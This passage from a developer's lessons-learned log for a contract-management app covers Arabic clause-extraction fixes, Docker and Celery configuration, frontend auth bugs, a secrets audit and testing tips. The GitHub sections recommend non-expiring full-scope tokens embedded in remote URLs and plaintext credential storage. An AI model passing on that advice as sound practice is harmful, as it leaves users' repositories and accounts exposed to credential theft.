  - Chunk < 20,000 chars → max_tokens = 24,000 (saves 62% vs 64k)
  - Chunk >= 20,000 chars → max_tokens = 32,000 (saves 50% vs 64k)
- Dynamic value calculated and logged at DEBUG level for each API call
- Note: Do NOT go below these values — earlier attempt with dynamic formula failed
  because Arabic JSON output is denser than estimated (see Lesson 1)

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Never hardcode max_tokens to maximum value for Arabic content
- Use the tiered approach — tested and confirmed safe
- Monitor Anthropic API usage at console.anthropic.com after each extraction
- Do not use dynamic formula (input_chars / 4 * 1.5) — underestimates Arabic output density

---

## 13. Clause Extraction — Definitions Clause Not Formatted as Bullet Points

**Problem:**
- مادة (1) in General Conditions contains 25+ definitions
- All definitions were stored and displayed as one long unreadable paragraph
- Terms and explanations were merged together with no visual separation

**Root Cause:**
- No instruction in SYSTEM_PROMPT for how to format definitions clauses
- Claude merged all definitions into continuous prose
- Frontend rendered clause content as a single `<p>` tag with no structure

**Fix — Part 1: Extraction (Guideline 12 added to SYSTEM_PROMPT):**
- Instructs Claude to format definitions as bullet points:
  ```
  - الهيئة أو العميل: يقصد بها الهيئة القومية للأنفاق
  - ممثل الهيئة: يقصد به الإستشارى العام للمشروع
  ```
- Each definition merged onto ONE line: `- term: explanation`
- Heading and intro sentence go on their own lines before the bullets
- Only applies to definitions clauses (تعريفات) not regular articles

**Fix — Part 2: Display (ClauseReviewCard.tsx):**
- Added `ClauseContentDisplay` component that:
  - Detects lines starting with `- ` automatically
  - Renders as RTL `<ul>` list:
    - `dir="rtl"` so bullets appear on RIGHT side (correct for Arabic)
    - `paddingRight: 1.5rem`, `paddingLeft: 0`
    - `textAlign: right`
  - Non-bullet lines render as regular `<p dir="auto">` paragraphs inline
  - Show more/Show less functionality preserved (shows max 4 bullets collapsed)

**Files:**
- `ai-backend/app/agents/clause_extractor.py` (Guideline 12)
- `apps/sign/src/components/review/ClauseReviewCard.tsx` (ClauseContentDisplay component)

**How to Avoid:**
- Arabic definitions clauses always need bullet point formatting
- Verify in DB after extraction:
  `SELECT LEFT(content, 300) FROM clauses WHERE title ILIKE '%تعريف%'`
- Should see lines starting with `- ` prefix
- In UI: bullets must appear on RIGHT side not left (use `dir="rtl"` on `<ul>`)

---

## 14. Docker — bcrypt Binary Fails on Windows

**Problem:**
- Backend container crashed on startup after `docker-compose up`
- Error: `Error loading shared library` or `invalid ELF header` for bcrypt
- Only happened on Windows machines

**Root Cause:**
- bcrypt is a native Node.js module compiled for the host OS
- When `node_modules` is volume-mounted from Windows into Linux container
- The Windows-compiled bcrypt binary is incompatible with Linux

**Fix:**
- Added `docker-entrypoint.sh` that runs `npm rebuild bcrypt` at container startup
- This recompiles bcrypt for the Linux container environment
- Added to `backend/Dockerfile`: `sed -i 's/\r//'` to strip CRLF from entrypoint

**Files:**
- `backend/docker-entrypoint.sh`
- `backend/Dockerfile`

**How to Avoid:**
- Any native Node.js module (bcrypt, sharp, canvas) will have this issue on Windows
- Always run `npm rebuild <module>` in the container, not on the host
- Add to entrypoint script, not Dockerfile build step (runs every container start)

---

## 15. Docker — CRLF Line Endings Crash Entrypoint on Linux

**Problem:**
- Backend container crashed with: `/usr/bin/env: 'bash\r': No such file or directory`
- Only happened after pulling from Windows-developed code

**Root Cause:**
- Windows uses CRLF (`\r\n`) line endings
- Linux expects LF (`\n`) only
- Git on Windows sometimes commits CRLF even with autocrlf settings
- The `\r` in bash scripts causes Linux to look for `bash\r` instead of `bash`

**Fix:**
- Added to `backend/Dockerfile` build step:
  `sed -i 's/\r//' /app/docker-entrypoint.sh`
- This strips all carriage returns at Docker build time
- Permanent fix — works regardless of how the file was committed

**File:** `backend/Dockerfile`

**How to Avoid:**
- Always add `sed -i 's/\r//'` in Dockerfile for any shell scripts
- Configure Git globally: `git config --global core.autocrlf input`
- Check for CRLF: `cat -A docker-entrypoint.sh | grep '\^M'`

---

## 16. Docker — Celery Worker Code Changes Not Taking Effect

**Problem:**
- Modified `tasks.py` or `clause_extractor.py` but celery worker kept using old code
- Restarting the container didn't help
- Changes were invisible to the running worker

**Root Cause:**
- The celery-worker container in `docker-compose.yml` only had:
  `volumes: - uploads_data:/app/uploads`
- It did NOT have the source code mounted: `./ai-backend:/app`
- The worker was using code baked into the Docker image at build time
- Only `docker-compose up --build` would pick up changes — very slow

**Fix:**
- Added source code volume mount to celery-worker in `docker-compose.yml`:
  `- ./ai-backend:/app`
- Now changes to any Python file are immediately visible to the worker
- Only need `docker restart sign-celery-worker` not a full rebuild

**File:** `docker-compose.yml`

**How to Avoid:**
- Always check if the container has a source code volume mount
- Without `./ai-backend:/app` mount → must rebuild image for every code change
- With mount → just restart the container: `docker restart sign-celery-worker`

---

## 17. Docker — Concurrency Set to 1 (Sequential Processing)

**Problem:**
- Uploading 3 documents → total processing time 20+ minutes
- Second document couldn't start until first finished
- Third document couldn't start until second finished
- Users saw 0% → 33% → 66% → 100% progress very slowly

**Root Cause:**
- `docker-compose.yml` had: `command: celery -A app.tasks worker --concurrency=1`
- Only ONE document could be processed at a time
- With 3 documents at ~4 min each: total = 12+ minutes sequential wait

**Fix:**
- Changed to `--concurrency=3`
- All 3 documents now process in parallel
- Total time: max(doc1_time, doc2_time, doc3_time) instead of sum
- Also raised memory limit from 2G to 3G to support 3 parallel workers (~512MB each)

**File:** `docker-compose.yml`

**How to Avoid:**
- Always set concurrency to number of expected parallel documents
- Monitor with: `docker exec sign-celery-worker celery inspect stats 2>/dev/null`
- Check `"max-concurrency"` and `"processes"` in output
- Memory formula: concurrency × 512MB + 512MB overhead = minimum container memory

---

## 18. Docker — Celery Tasks Killed at 600s

**Problem:**
- Large documents (General Conditions — 81k chars) always failed
- Task killed at exactly 600 seconds every time
- NestJS would auto-retry → killed again → infinite retry loop

**Root Cause:**
- Default Celery hard time limit was 600 seconds (10 minutes)
- Large Arabic documents need 15-20 minutes for full Claude API processing
- Worker process received SIGKILL at exactly 600s with no warning

**Fix:**
- Added to docker-compose celery command:
  `--time-limit=2400 --soft-time-limit=1800`
- Soft limit (30 min): graceful SoftTimeLimitExceeded exception — task can clean up
- Hard limit (40 min): absolute SIGKILL — never reached in practice with chunking

**File:** `docker-compose.yml`

**How to Avoid:**
- Always check document size before setting time limits
- General Conditions (81k chars) with chunking needs ~20 minutes total
- Formula: (num_chunks × avg_chunk_api_time) + merge_time = total time needed
- Set hard limit to 2x estimated total time as safety buffer

---

## 19. Word File Extraction — Tables and Headers Missing

**Problem:**
- Word files with contract terms in tables had those terms missing from extraction
- Extracted text had large gaps compared to actual document content
- Clause extraction missed payment schedules and liability clauses entirely

**Root Cause:**
- `_extract_docx()` in `text_extractor.py` only read `doc.paragraphs`
- Text inside table cells is NOT included in `doc.paragraphs`
- Headers and footers are also NOT in `doc.paragraphs`
- Arabic contracts frequently put payment terms and liability clauses in table cells

**Fix:**
- Added table cell extraction loop:
  ```python
  for table in doc.tables:
      for row in table.rows:
          for cell in row.cells:
              if cell.text.strip():
                  paragraphs.append(cell.text.strip())
  ```
- Added header paragraph extraction from `doc.sections`

**File:** `ai-backend/app/services/text_extractor.py`

**How to Avoid:**
- Always extract from paragraphs + tables + headers for Word files
- Verify extraction quality: `SELECT length(extracted_text) FROM document_uploads WHERE ...`
- A 3MB Word file should yield at least 50,000+ chars if tables are properly extracted

---

## 20. Database — Orphaned Clauses Inflating Dashboard Count

**Problem:**
- Dashboard showed 179 clauses but only 85 were in the active project
- Clause count was wrong and confusing for users

**Root Cause:**
- Multiple failed/killed extraction runs had saved SOME clauses to `clauses` table
- But the pipeline never completed so `contract_clauses` junction table entries were never created
- Dashboard query counted ALL rows in `clauses` table instead of only linked ones
- 94 "ghost clauses" had no `source_document_id` and no `contract_clauses` entry

**Fix:**
- Deleted orphaned clauses:
  ```sql
  DELETE FROM clauses WHERE id NOT IN (
    SELECT DISTINCT clause_id FROM contract_clauses
  );
  ```
- Fixed dashboard query to use `innerJoin` on `contract_clauses` table
- Now only counts clauses properly linked to contracts via junction table

**Files:**
- `backend/src/modules/dashboard-analytics/dashboard-analytics.service.ts`

**How to Avoid:**
- After any killed/failed extraction run → check for orphaned clauses
- Check: `SELECT COUNT(*) FROM clauses WHERE id NOT IN (SELECT clause_id FROM contract_clauses)`
- If count > 0 → run the DELETE query above before reprocessing
- If dashboard numbers look wrong → first check for orphaned clauses

---

## 21. Frontend — currentUser Always Null After Page Refresh

**Problem:**
- After page refresh, user appeared logged in (token in localStorage)
- But `currentUser` in Redux was always `null`
- All permission checks failed: comment edit/delete, role checks, admin detection

**Root Cause:**
- Redux auth slice restores `token` from localStorage on startup
- But `user` object (with id, role, name) is NOT restored from localStorage
- `refreshUserProfile()` was only called in `MfaSetupPage` — never on app startup
- So after refresh: `isAuthenticated = true` but `currentUser = null` permanently

**Fix:**
- Added `useEffect` in both `AppLayout.tsx` and `AdminLayout.tsx`:
  ```javascript
  useEffect(() => {
    if (isAuthenticated && !user) {
      refreshUserProfile();
    }
  }, []);
  ```
- This fetches user profile from API on mount whenever token exists but user is null

**Files:**
- `apps/sign/src/components/layout/AppLayout.tsx`
- `apps/sign/src/components/layout/AdminLayout.tsx`

**How to Avoid:**
- Any feature using `currentUser?.id` or `currentUser?.role` depends on this fix being present
- Always test permission features after PAGE REFRESH, not just after fresh login
- If permission checks fail → first check if `currentUser` is null in Redux DevTools

---

## 22. Frontend — Arabic Text Displaying Left-to-Right

**Problem:**
- Extracted Arabic clauses displayed with text aligned to LEFT
- Should be RIGHT aligned (RTL direction)
- Made Arabic content very hard to read

**Root Cause:**
- Clause title and content elements had no RTL direction specified
- Browser defaulted to LTR for all text regardless of content language
- `dir="auto"` was not applied to text containers

**Fix:**
- Added `dir="auto"` and `style={{ unicodeBidi: 'plaintext' }}` to:
  - Clause titles (`<h4>`) in ClauseReviewCard
  - Clause content (`<p>`) in ClauseReviewCard
  - Edit textarea and title input in ClauseReviewCard
  - All clause display elements in ContractDetailPage (list view + modal)
- `dir="auto"` makes browser detect direction from first strong directional character
- Arabic text → right aligned automatically
- English text → left aligned automatically
- Mixed content → each paragraph detects its own direction

**Files:**
- `apps/sign/src/components/review/ClauseReviewCard.tsx`
- `apps/sign/src/pages/app/ContractDetailPage.tsx`

**How to Avoid:**
- Always add `dir="auto"` to any element that may display Arabic text
- Never assume all text is LTR in a bilingual Arabic/English application
- Test with actual Arabic content after any UI change to clause or document display

---

## 23. Frontend — Comment Edit/Delete Icons Not Showing

**Problem:**
- Pencil ✏️ and trash 🗑️ icons were in the code but never visible on hover
- No error shown — icons simply didn't appear
- `opacity-0 group-hover:opacity-100` was applied but elements didn't exist in DOM

**Root Cause (Two Issues):**

**Issue 1 — currentUser was null (see Lesson 21):**
- `isAuthor = comment.user_id === currentUser?.id` → always false when currentUser is null
- `canEdit = isAuthor` → false → pencil icon not rendered at all
- `canDelete = isAuthor || isAdmin` → false → trash icon not rendered at all
- `opacity-0/opacity-100` only helps if elements exist in the DOM — they didn't

**Issue 2 — AdminLayout logout race condition:**
- `handleLogout` was not async/await
- `logout()` started (async API call in flight)
- `navigate('/auth/login')` fired immediately before logout completed
- Redux state still had user data → LoginPage saw authenticated user → redirect loop

**Fix:**
- Fixed currentUser null issue by adding refreshUserProfile on mount (Lesson 21)
- Made `handleLogout` async/await in AdminLayout:
  ```javascript
  const handleLogout = async () => {
    await logout();
    navigate('/auth/login', { replace: true });
  };
  ```

**Files:**
- `apps/sign/src/components/layout/AdminLayout.tsx`
- `apps/sign/src/components/layout/AppLayout.tsx`

**How to Avoid:**
- Always make logout handlers async/await — logout is an async API operation
- Test icon visibility after PAGE REFRESH not just after fresh login
- If icons not showing → check currentUser in Redux DevTools first before debugging CSS

---

## 24. Frontend — Portal Chooser Redirect Loop for Admin Users

**Problem:**
- Users with SYSTEM_ADMIN role were always redirected to `/admin/dashboard`
- Portal chooser page (`/portal-select`) never appeared
- After colleague implemented the portal chooser, it was still bypassed for existing sessions

**Root Cause (Three Issues):**

**Issue 1 — Existing session bypasses LoginPage entirely:**
- Portal chooser redirect logic was only in `LoginPage.tsx`
- Only fires on fresh login flow
- Users with valid token in localStorage → app skips LoginPage completely
- Goes directly to last visited URL (/admin/dashboard)
- Portal chooser never triggered for returning users

**Issue 2 — AdminLayout had no user profile hydration:**
- `AppLayout.tsx` had `refreshUserProfile()` on mount (Lesson 21)
- `AdminLayout.tsx` did NOT have it
- `user` was null when navigating directly to `/admin/*`
- Role check could not run → portal chooser logic never executed

**Issue 3 — Logout race condition (see Lesson 23):**
- Non-async logout caused redirect loops between login and admin pages

**Fix:**
- Added `sessionStorage` flag `portal-chosen` to track portal selection per browser session
- In `AdminLayout.tsx` — added useEffect to redirect if flag not set:
  ```javascript
  useEffect(() => {
    if (isAdminRole && !sessionStorage.getItem('portal-chosen')) {
      navigate('/portal-select');
    }
  }, [user]);
  ```
- In `PortalSelectPage.tsx` — set flag when user clicks either portal button:
  ```javascript
  sessionStorage.setItem('portal-chosen', '1');
  ```
- On logout → clear the flag so chooser shows again next session:
  ```javascript
  sessionStorage.removeItem('portal-chosen');
  ```
- Added `refreshUserProfile()` on mount to AdminLayout (same as AppLayout)

**Files:**
- `apps/sign/src/components/layout/AdminLayout.tsx`
- `apps/sign/src/pages/auth/PortalSelectPage.tsx`

**How to Avoid:**
- Never put role-based redirect logic ONLY in LoginPage — it won't run for existing sessions
- Always use layout-level checks for role-based redirects (AdminLayout, AppLayout)
- Use sessionStorage to prevent repeated redirects within the same browser session
- Always clear sessionStorage portal flags on logout
- Test ALL redirect logic with an EXISTING session (don't logout first before testing)

---

## 25. GitHub — Personal Access Token Expiring

**Problem:**
- Push failed with 403 Permission denied
- Colleague couldn't pull latest updates
- Token had expired — email notification was sent but missed

**Root Cause:**
- GitHub PAT (Personal Access Token) was created with an expiry date
- Token expired → all push/pull operations fail silently with 403

**Fix:**
- Generate new classic PAT at: https://github.com/settings/tokens
- Must use: "Generate new token (classic)" — NOT fine-grained tokens
- Must check: `repo` scope checkbox (full control of repositories)
- Set expiration to: "No expiration" for development tokens
- Classic tokens start with `ghp_` — fine-grained tokens start with `github_pat_`
- Update remote URL: `git remote set-url origin https://TOKEN@github.com/USER/REPO.git`

**How to Avoid:**
- Always set token expiration to "No expiration" for active development
- Save token immediately in a password manager — GitHub shows it only ONCE
- Never share token in chat, email, or screenshots — treat like a password
- If you see `github_pat_` prefix → wrong token type created (fine-grained won't work)
- Best long-term solution: use GitHub CLI (`gh auth login`) — no token management needed

---

## 26. GitHub — Mac osxkeychain Interfering with Token

**Problem:**
- Colleague on Mac couldn't push/pull even with the correct new token
- Error: "Device not configured" or "Invalid username or token"
- Token was verified correct but Mac was using cached old credentials

**Root Cause:**
- Mac stores GitHub credentials in the system keychain (osxkeychain)
- Old expired credentials were cached in keychain
- New token in the remote URL was being ignored — keychain credentials take priority
- The `credential.helper = osxkeychain` Git config intercepts all Git operations

**Fix:**
- Clear cached credentials from Mac keychain:
  ```
  git credential-osxkeychain erase
  host=github.com
  protocol=https
  [press Enter twice]
  ```
- Change credential helper to store:
  `git config --global credential.helper store`
- Update remote URL with new token
- Better permanent solution: Use GitHub CLI:
  `gh auth login` → login via browser → credentials managed automatically

**How to Avoid:**
- Mac developers should use GitHub CLI instead of token-in-URL approach
- `gh auth login` → browser login → no token management needed ever
- Never store token directly in remote URL on Mac (keychain will override it)
- For Windows developers: token in remote URL works correctly without this issue

---

## 27. Clause Extraction — مادة (N) Prefix Appearing in Clause Content

**Problem:**
- Extracted clauses showed `مادة (1)` or `البند رقم (1)` at the start of every clause content
- The clause number was visible TWICE — once in the clause number field AND again at the start of the content
- Made clause content look messy and unprofessional in the UI

**Root Cause:**
- Claude was correctly including the article marker in its JSON response content field
- No stripping was happening before saving to the database
- The `clause_number` field already stores the number separately — repeating it in content was redundant
- Example of wrong output:
  ```
  clause_number: "1"
  content: "مادة (1) موضوع العقد: التصميم الكامل..."
  ```
- Example of correct output:
  ```
  clause_number: "1"
  content: "موضوع العقد: التصميم الكامل..."
  ```

**Fix:**
- Added `_strip_article_prefix()` static method to `ClauseExtractorAgent`
- Regex covers ALL Arabic clause marker variations:
  - `مادة (1)` / `مادة (١)` — with brackets
  - `مادة 1` / `مادة ١` — without brackets
  - `المادة (1)` — with definite article ال
  - `مادة رقم (1)` — with رقم
  - `البند رقم (1)` — Contract Agreement format
  - `البند (1)` — without رقم
  - Optional trailing `: - – —` after the marker
- Called in `_parse_json()` on EVERY clause before returning:
  ```python
  @staticmethod
  def _strip_article_prefix(content: str) -> str:
      return _ARTICLE_PREFIX_RE.sub('', content).strip()
  ```
- Applied on both return paths in `_parse_json()`:
  - Fast path (direct JSON array)
  - Prose-wrapped path (JSON inside text)

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always strip article markers from content before saving — the number lives in `clause_number` field
- After any extraction run verify: `SELECT clause_number, LEFT(content, 50) FROM clauses WHERE source_document_id = '...' LIMIT 5`
- Content should start directly with the clause text — never with `مادة` or `البند`
- If prefix appears → check that `_strip_article_prefix()` is being called in `_parse_json()`

---

## 28. Docker — Backend Not Rebuilt After Colleague Adds npm Packages

**Problem:**
- Login failed with "Invalid email or password" even with correct credentials
- Backend appeared to be running (container was up, health check passed)
- Actual cause: backend failed to compile 3 missing packages from colleague's new module
- TS errors: `Cannot find module 'archiver'`, `Cannot find module 'geoip-lite'`, `Cannot find module 'ua-parser-js'`
- Misleading because the error shown to the user had nothing to do with packages

**Root Cause:**
- Colleague added 3 new npm packages to `package.json` and `package-lock.json` as part of admin-security module
- After pulling the colleague's changes, `docker-compose up -d` was run WITHOUT `--build`
- Docker reused the old cached image — its `node_modules` anonymous volume was created from the old image
- The `- /app/node_modules` anonymous volume in docker-compose.yml preserves node_modules from the image
- Without `--build`, `npm ci` never re-ran → new packages never installed → backend TS compile failed silently
- NestJS still started (using last cached compiled JS) but the admin-security module failed at runtime

**Fix:**
- Installed packages manually in the running container: `docker exec sign-backend npm install archiver geoip-lite ua-parser-js @types/archiver @types/geoip-lite @types/ua-parser-js`
- Then did a proper rebuild to make it permanent: `docker-compose up --build -d backend`
- No code changes needed — packages were already correctly in `package.json` and `package-lock.json`

**File:** `docker-compose.yml` (backend service volumes config)

**How to Avoid:**
- After pulling ANY commit that touches `backend/package.json` or `backend/package-lock.json`:
  ```bash
  docker-compose up --build -d backend
  ```
- Signal to watch for: colleague's PR diff shows changes to `package.json` or `package-lock.json`
- Always check pull safety output for `package.json` changes before running `docker-compose up -d`
- If login or any feature suddenly breaks after a pull with no obvious cause → check backend TS compile errors first:
  ```bash
  docker logs sign-backend 2>&1 | grep -E "error TS|Found [0-9]+ error"
  ```
- Quick fix without rebuild: `docker exec sign-backend npm install <package-name>`

---

## 29. Security — Secrets Audit Before AWS Deployment

**What was found:**
- Root .gitignore was missing .env.staging, .env.production, *.pem, *.key, *.p12, *.pfx
- No per-service .gitignore files existed in backend/, ai-backend/, apps/sign/, apps/cenvox/
- 3 seed passwords were hardcoded in admin-users.seed.ts
- DB fallback credentials hardcoded in data-source.ts and settings.py (low priority)

**What was fixed:**
- Root .gitignore patched with 6 missing patterns
- 4 per-service .gitignore files created
- Seed passwords moved to SEED_ADMIN_PASSWORD_* env vars
- Committed: 405058e

**Still pending (before AWS only):**
- Remove DB fallback credentials in data-source.ts and settings.py
- Create docker-compose.prod.yml

**How to avoid:**
- Run secrets audit before every major deployment
- Never hardcode passwords in seed files
- Always check .gitignore covers all env and certificate patterns

---

## 30. Frontend — Hardcoded localhost:5175 CENVOX Backlinks in SIGN Layouts

**Problem:**
- 4 navigation links in SIGN hardcode localhost:5175 (CENVOX landing page URL)
- Files: AuthLayout.tsx (lines 35, 60), AdminLayout.tsx (line 337), TopBar.tsx (line 57)
- These are the CENVOX attribution links required by brand rules in CLAUDE.md

**Root Cause:**
- Cross-app URLs were hardcoded instead of using env vars

**Fix:**
- Replace all 4 with: `import.meta.env.VITE_CENVOX_URL || 'http://localhost:5175'`
- Add `VITE_CENVOX_URL=http://localhost:5175` to apps/sign/.env and .env.example
- Scheduled for Phase 1.2 (the localhost fix pass)

**How to Avoid:**
- Any URL pointing to another app must always use an env var, never hardcoded

---

## 31. Backend — Silent Catch Blocks Masking Critical Failures

**Problem:**
- 12 catch blocks across the backend were swallowing errors silently
- Most critical: Paymob webhook activation failure returning 200 silently (user charged, never activated — zero visibility)
- Document extraction failures saved FAILED status to DB but no log entry
- DocuSign getSigningUrl failures returned misleading "not a pending signer" message when the real cause was DocuSign API being down

**Root Cause:**
- No standardised error logging pattern enforced across modules
- Some blocks were copy-pasted without adding Logger

**Fix:**
- Added NestJS Logger.error/warn to all 12 silent blocks
- Pattern: `logger.error('[MethodName] context: ${error.message}', error.stack)`
- Non-critical catches (health checks, email fallbacks, snapshots): logger only
- Critical catches: logger + rethrow
- Cron/Bull processor catches: logger only, never rethrow

**How to Avoid:**
- Every catch block must have at minimum a logger.warn call
- Run this after every new module to catch empty blocks early:
  `grep -rn -A2 "} catch" backend/src --include="*.ts" | grep -v "logger\|Logger\|throw\|//\|return"`
- Never use console.log in catch blocks — always NestJS Logger

---

## 32. Backend — Paymob Webhook Activation Needs Idempotency Before Fix

**Problem:**
- subscriptions.service.ts activateSubscription() fails silently inside webhook
- User is charged but subscription never activated
- Cannot simply rethrow — Paymob retries on non-200 responses which would cause double-activation

**Root Cause:**
- No idempotency check before activation
- No DB flag to track webhook processing state

**Temporary Fix (Phase 1.4):**
- Added CRITICAL logger.error with full context
- Added detailed TODO(1.6) comment explaining what needs to be done

**Permanent Fix (Phase 1.6 — pending Paymob test keys):**
- Add idempotency check before activation
- Add DB flag/transaction log for webhook processing state
- Add admin alert when activation fails after payment
- Only return non-200 to Paymob after idempotency is confirmed safe

**How to Avoid:**
- Payment webhooks must always have idempotency before any state mutation
- Never return 200 to a payment provider without confirming the action succeeded

---

## 33. Docker — New npm Package Not Found After Rebuild

**Problem:**
- Added a new npm package (e.g. `joi`) to `backend/package.json`
- Ran `docker-compose up --build -d backend`
- Backend still crashed: `TS2307: Cannot find module 'joi' or its corresponding type declarations`
- Error persisted even after repeated `--build` rebuilds

**Root Cause:**
- `docker-compose.yml` backend service has an anonymous volume: `- /app/node_modules`
- This anonymous volume is created from the image on first run and then persists independently
- `docker-compose up --build` rebuilds the image (running `npm ci` inside), but the container runtime MOUNTS the pre-existing anonymous volume OVER the image's node_modules directory
- The container therefore uses the OLD stale node_modules, not the freshly installed one from the image
- The new package exists in the image layer but is invisible at runtime because the volume shadows it

**Fix:**
```bash
docker-compose up --build --force-recreate --renew-anon-volumes -d backend
```
- `--force-recreate` — recreates the container even if config hasn't changed
- `--renew-anon-volumes` — destroys the anonymous `node_modules` volume and creates a fresh one from the new image layer
- Plain `--build` alone is NOT sufficient when an anonymous `node_modules` volume exists

**File:** `docker-compose.yml` (backend service `- /app/node_modules` anonymous volume)

**How to Avoid:**
- Whenever you add or update any npm package in `backend/package.json`, ALWAYS use the full command:
  ```bash
  docker-compose up --build --force-recreate --renew-anon-volumes -d backend
  ```
- If you see `Cannot find module` for a package you just installed → anonymous volume is stale
- Check what volumes exist: `docker volume ls | grep node_modules`
- Quick alternative (no rebuild): `docker exec sign-backend npm install <package-name>` then restart

---

## 34. Backend — New Required Joi Var Breaks Teammates' Environments

**Problem:**
- Added a new `.required()` entry to the Joi `validationSchema` in `app.module.ts`
- Committed and pushed
- Teammate pulls, runs `docker-compose up -d`, backend crashes immediately:
  `Config validation error: "NEW_VAR" is required`
- Teammate has no idea what `NEW_VAR` is or where to get it

**Root Cause:**
- NestJS Joi validation runs at bootstrap — the app refuses to start if any `.required()` var is missing
- Adding `.required()` to the schema is a **breaking change** for every teammate's local environment
- If the new var is not in `.env.example` (with a description) and the team is not notified, they have no way to know what to add or what value to use

**Fix (process):**
1. In the same commit that adds the new `.required()` var to `app.module.ts`:
   - Add it to `backend/.env.example` with a description comment
   - Add it to your own `backend/.env` with a real value
2. Notify all teammates BEFORE or immediately AFTER pushing:
   > "New required env var added: `NEW_VAR` — you must add it to your local `backend/.env` before next `docker-compose up`. See `.env.example` for description."
3. Default to `.optional().allow('').default('...')` whenever there is a reasonable fallback — only use `.required()` when there is truly no safe default value

**File:** `backend/src/app.module.ts` (Joi `validationSchema`)

**How to Avoid:**
- Treat every new `.required()` Joi var as a breaking change — same discipline as a DB migration
- Never push a new `.required()` var without updating `.env.example` in the same commit
- When in doubt: use `.optional().default('fallback')` — fail-fast is only worth it when there is no sane default
- If a teammate reports "backend won't start after pull" → first check `docker logs sign-backend 2>&1 | grep "Config validation error"` — missing required env var is the most common cause

---

## 35. Testing — AuthService Has 14 Constructor Dependencies

**Problem:**
- Started writing AuthService unit tests by mocking only the obvious dependencies (User repo, JwtService)
- TestingModule.compile() threw: "Nest can't resolve dependencies of the AuthService"
- Each missing service had to be discovered one at a time by error message

**Root Cause:**
- AuthService has 14 constructor injections — 4 repositories, JwtService, ConfigService, EmailService, NotificationDispatchService, plus 6 Phase 3.3 security services (Session, KnownDevice, SuspiciousLogin, GeoLookup, UserAgent, SecurityEvent)
- _finalizeLogin() is private and runs on EVERY successful login path — it touches all 6 Phase 3.3 services

**Fix:**
- Mock every single constructor dependency upfront — read the constructor signature first, write all mocks before instantiating the TestingModule
- For _finalizeLogin testing: do not try to call the private method directly. Call login() and assert on mock call counts (e.g. expect(mockSessionService.create).toHaveBeenCalledTimes(1))

**File:** `backend/src/modules/auth/auth.service.spec.ts`

**How to Avoid:**
- Before writing any service spec, count the constructor parameters and prepare ALL mocks first
- Treat private methods as black boxes — observe behaviour through the public API and mock assertions

---

## 36. Testing — Vite Config Must Stay Untouched, Use Separate vitest.config.ts

**Problem:**
- First instinct was to add a `test: { ... }` block to vite.config.ts
- This works, but pollutes the build config with test-only dependencies
- Risk that future changes to vite.config.ts could affect tests, or vice versa

**Root Cause:**
- Vite and Vitest can share config, but they don't have to
- Mixing them couples build behaviour to test behaviour — bad separation of concerns

**Fix:**
- Created a separate `apps/sign/vitest.config.ts` with its own defineConfig from vitest/config
- vite.config.ts was never modified
- Dev server, build output, and Vite plugins all completely unaffected

**File:** `apps/sign/vitest.config.ts` (new), `apps/sign/vite.config.ts` (untouched)

**How to Avoid:**
- Always create a separate vitest.config.ts unless there is a specific reason to share
- The "shared config" pattern is convenient for tiny projects but a liability for larger ones

---

## 37. Testing — Mock at Service Level Never at Axios Level

**Problem:**
- Considered mocking axios directly with vi.mock('axios') in frontend tests
- Discovered apps/sign/src/services/api/axios.ts imports the Redux store as a side effect:
  `import { store } from '@/store';`
- This means importing axios.ts pulls store initialization into every test
- Also: the response interceptor sets window.location.href = '/auth/login' on 401, which fires in jsdom

**Root Cause:**
- The axios instance is wired into the Redux store and the router — touching axios in tests means touching all of that
- Service-layer mocks (authService, dashboardAnalyticsService) are completely independent of axios internals

**Fix:**
- Always mock at the service level: vi.mock('@/services/dashboard/dashboardAnalyticsService')
- Never import axios.ts in tests
- The store side effect and the redirect interceptor disappear entirely

**File:** `apps/sign/src/pages/app/DashboardPage.test.tsx`, `apps/sign/src/pages/auth/LoginPage.test.tsx`

**How to Avoid:**
- Always mock the highest layer that gives you control — services, not transports
- If a transport file (axios, fetch wrappers) imports stores or routers, mocking it is a trap

---

## 38. Testing — pytest.ini Must Set pythonpath = . or All Imports Fail

**Problem:**
- Created tests/test_clause_extractor.py with `from app.agents.clause_extractor import ClauseExtractorAgent`
- pytest immediately failed: ModuleNotFoundError: No module named 'app'
- pytest discovered tests but could not resolve the project root

**Root Cause:**
- pytest's default rootdir detection does not add the project directory to sys.path
- Without explicit pythonpath config, "from app.X" cannot resolve
- Inside Docker the same imports work because the container WORKDIR is /app/

**Fix:**
- Created ai-backend/pytest.ini with `pythonpath = .`
- Now pytest treats ai-backend/ as the project root for imports

**File:** `ai-backend/pytest.ini`

**How to Avoid:**
- For any new pytest project: create pytest.ini with pythonpath = . FIRST, before writing any test
- Do not rely on conftest.py sys.path hacks — pytest.ini is the canonical solution

---

## 39. Testing — Celery bind=True Tasks Need .run(payload) Not task(None, payload)

**Problem:**
- Tried to call run_extract_clauses(None, request_data) directly in a test
- Got: TypeError: run_extract_clauses() takes 2 positional arguments but 3 were given
- Confusing because the function signature literally is (self, request_data) — that's 2 args

**Root Cause:**
- Celery's @task decorator with bind=True wraps the function in a Task object
- Calling task(args) goes through the Task.__call__ proxy which auto-injects self
- So task(None, payload) becomes (self=task_instance, None, payload) — 3 args total

**Fix:**
- Use task.run(payload) instead — .run() is the unwrapped function with self already bound
- Pattern: `result = run_extract_clauses.run({"full_text": "..."})`
- This bypasses the Celery proxy entirely and calls the raw function

**File:** `ai-backend/tests/test_tasks.py`

**How to Avoid:**
- For bind=True Celery tasks, always use .run() in tests — never call the task object directly with self as the first arg
- For bind=False tasks, calling the task directly works as expected

---

## 40. DTOs — Fields Without Class-Validator Decorators Are Silently Stripped

**Problem:**
- `AddReplyDto.is_internal_note` had a TypeScript type (`?: boolean`) but zero class-validator decorators
- NestJS ValidationPipe with `whitelist: true` stripped it silently on every request
- Every intended internal note was saved as a public reply — no error, no warning

**Root Cause:**
- `whitelist: true` removes any property that has no class-validator decorator, regardless of TypeScript type
- TypeScript types are compile-time only — class-validator decorators are runtime metadata
- A property typed as `boolean` but missing `@IsBoolean()` is invisible to the ValidationPipe

**Fix:**
- Added `@IsBoolean()` to `AddReplyDto.is_internal_note`
- Rule: every DTO property that should reach the handler MUST have at least one class-validator decorator

**File:** `backend/src/modules/support/dto/create-ticket.dto.ts`

**How to Avoid:**
- When adding a field to a DTO, always add a class-validator decorator at the same time — never a bare TypeScript type
- Audit DTOs by looking for `@IsOptional()` without any other decorator — those fields are stripped

---

## 41. Defense-in-Depth — Frontend Filters Are Never Enough

